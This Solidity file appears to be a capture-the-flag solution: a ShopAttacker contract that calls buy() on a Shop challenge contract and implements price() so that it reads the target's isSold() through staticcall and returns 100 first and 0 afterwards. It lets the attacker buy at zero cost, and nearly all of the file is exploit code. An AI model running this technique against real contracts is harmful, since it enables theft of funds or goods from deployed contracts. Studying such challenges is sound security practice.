pragma solidity ^0.6.0;

abstract contract Shop {
    uint public price;
    bool public isSold;
    function buy() external virtual;
}

contract ShopAttacker {

  Shop public challenge;
  uint256 timesCalled = 0;

  constructor(address challengeAddress) public {
    challenge = Shop(challengeAddress);
  }

  function attack() public {
    challenge.buy();
  }

  function price() public view returns(uint) {
    // Create a call to the isSold() function which will return differing true or false values
    (, bytes memory result) = address(challenge).staticcall(abi.encodeWithSignature("isSold()"));
    // Decoding the boolean to be used
    bool sold = abi.decode(result, (bool));
    // Depending on if sold is true or false, return 0 or 100
    return sold ? 0 : 100;
  }
}
